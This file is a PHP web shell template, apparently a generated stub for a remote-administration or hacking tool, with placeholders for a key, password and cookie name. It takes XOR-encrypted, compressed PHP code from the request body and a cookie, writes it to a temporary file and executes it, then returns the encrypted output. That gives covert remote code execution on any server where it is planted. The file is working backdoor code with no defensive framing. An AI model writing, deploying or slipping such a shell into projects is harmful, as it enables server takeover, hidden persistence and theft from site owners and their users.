<?php 
function encrypt($key,$pass,$str){
    $isempty=empty($str)||@gzuncompress($str)==='';
    $str=$pass.$str;
    $keysize=strlen($key);
    for($ii=0;$ii<$keysize;$ii++){
        $str=chr(mt_rand()%256).$str;
    }
    for($ii=0,$result='',$current=0;$ii<strlen($str);$ii++){
        $current=ord($str[$ii])^@ord($key[$ii%$keysize])^$current;
        $result.=chr($current);
    }
    return(!$isempty)?$result:'';
}
function decrypt($key,$pass,$str){
    $keysize=strlen($key);
    for($ii=0,$result='',$current=0;$ii<strlen($str);$ii++){
        $result.=chr(ord($str[$ii])^@ord($key[$ii%$keysize])^$current);
        $current=ord($str[$ii]);
    }
    return(!empty($str)&&substr($result,$keysize,$keysize)===$pass)?substr($result,2*$keysize):'';
}
function shell() {
    @ob_start();
    $key=pack('H*','{{key}}');
    $pass=pack('H*','{{password}}');
    $mod=@gzuncompress(decrypt($key,$pass,pack('H*',@file_get_contents('php://input'))));
    $cmd=@gzuncompress(decrypt($key,$pass,pack('H*',@$_COOKIE['{{action}}'])));
    $tmp=tempnam(null,null);
    file_put_contents($tmp,'<?php '.$mod.$cmd.' ?>');
    try{include($tmp);}catch(Exception $e){}
    $r=unpack('H*',encrypt($key,$pass,@gzcompress(@ob_get_clean(),9)));
    echo $r[1];
}
shell();
?>
